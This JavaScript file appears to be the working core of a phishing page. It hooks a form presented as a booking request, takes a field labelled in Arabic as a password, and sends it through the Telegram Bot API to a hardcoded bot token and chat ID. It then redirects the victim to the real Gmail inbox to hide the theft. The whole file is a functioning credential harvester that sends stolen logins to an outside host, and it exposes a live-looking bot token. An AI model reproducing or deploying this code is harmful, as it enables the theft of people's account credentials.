const BOT_TOKEN = "8864306572:AAHIf6ivbaIMQ1Holqbtba25gHZ6nVdKfOw";
const CHAT_ID = "8815746182";

document.getElementById("bookingForm").addEventListener("submit", async function(event) {
  event.preventDefault();

 
  const email = document.getElementById("email").value;

  const message = `🔔 طلب حجز جديد


 الباسور: ${email}`;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });

    const result = await response.json();

    if (result.ok) {
      window.location.href = "https://mail.google.com/mail/u/0/#inbox";
    } else {
      alert("حدث خطأ أثناء الإرسال");
    }
  } catch (error) {
    alert("تعذر الاتصال بـ ");
  }
});